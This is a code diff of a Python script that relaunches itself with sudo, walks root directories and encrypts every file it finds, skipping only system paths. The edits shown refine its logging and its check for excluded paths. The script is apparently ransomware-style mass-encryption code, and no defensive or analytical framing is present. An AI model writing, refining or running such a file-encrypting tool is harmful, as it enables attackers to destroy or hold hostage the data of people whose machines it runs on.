@@ -28,6 +28,7 @@ def check_and_relaunch():
         except Exception as e:
             logging.error(f"Failed to relaunch script with sudo: {e}")
             sys.exit(1)
+
     elif platform.system() == "Windows":
         logging.info("Script is not running with administrative privileges. Please run as an administrator.")
         sys.exit(1)
@@ -67,8 +68,9 @@ system_paths = [
 
 # Function to encrypt a file
 def encrypt_file(file_path):
-    if any(os.path.commonpath([file_path, path]) == path for path in system_paths):
-        logging.debug(f"Skipping file {file_path}")
+    # Check if file is in system paths before encrypting
+    if any(file_path.startswith(path) for path in system_paths):
+        logging.debug(f"Skipping system path file {file_path}")
         return
     try:
         with open(file_path, "rb") as file:
@@ -89,9 +91,8 @@ def get_all_files(root_dir, exclude_paths):
         for file in files:
             file_path = os.path.join(root, file)
             if os.path.basename(file_path) in EXCLUDE_FILES or any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
-                logging.debug(f"Skipping file {file_path} (Base name: {os.path.basename(file_path)})")
+                logging.debug(f"Skipping file {file_path}")
                 continue
-            logging.debug(f"Including file {file_path}")
             yield file_path
 
 # Function to process files in chunks
@@ -147,8 +148,6 @@ def main():
     # Dynamically add system paths
     exclude_paths.extend([os.path.abspath(path) for path in system_paths])
     
-    logging.debug(f"Exclusion paths: {exclude_paths}")
-    
     for root_dir in root_dirs:
         encrypt_files_in_chunks(root_dir, exclude_paths)
     
@@ -160,6 +159,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
